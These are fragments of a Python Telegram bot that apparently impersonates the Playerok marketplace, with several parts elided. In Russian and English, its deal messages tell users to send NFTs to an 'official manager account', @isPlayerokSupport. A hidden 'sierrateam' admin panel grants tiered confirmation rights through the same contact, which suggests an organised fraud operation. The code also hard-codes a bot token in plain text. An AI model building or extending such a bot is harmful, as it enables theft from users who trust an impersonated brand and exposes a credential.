...
bot = Bot(token="8740393004:AAFXU1nc7m8Oj0RrX15EaEDwjfvT2DPR6nI")
dp = Dispatcher()
all_users = set() 
...
main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    ...
    [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/isPlayerokSupport")],
    ...
    if deal_id:
        ...
        if deal["type"] == "deal_gift":
            text_ru = (
                ...
                f"NFT ожидает отправки на официальный аккаунт менеджера - @isPlayerokSupport\n\n"
            ...
            text_en = (
                ...
                f"NFT must be sent to the official manager account — @isPlayerokSupport\n\n"
                f"⚠️ Attention:\n"
...
async def sierrateam_read_callback(callback: CallbackQuery):
    ...
    await safe_edit_message(
        callback,
        "👑 Админ-панель\n\nВыберите действие:\n\n🔓 Полный доступ: ❌ Отсутствует\n💼 Может подтверждать: Только подарки\n\n💎 Для получения полного доступа свяжитесь с @isPlayerokSupport",
...
async def agree_callback(callback: CallbackQuery):
    ...
    lang = user_languages.get(user_id, "ru")
    text = "Добро пожаловать в Playerok!\nПоддержка - @isPlayerokSupport" if lang == "ru" else "Welcome to Playerok!\nSupport - @isPlayerokSupport"
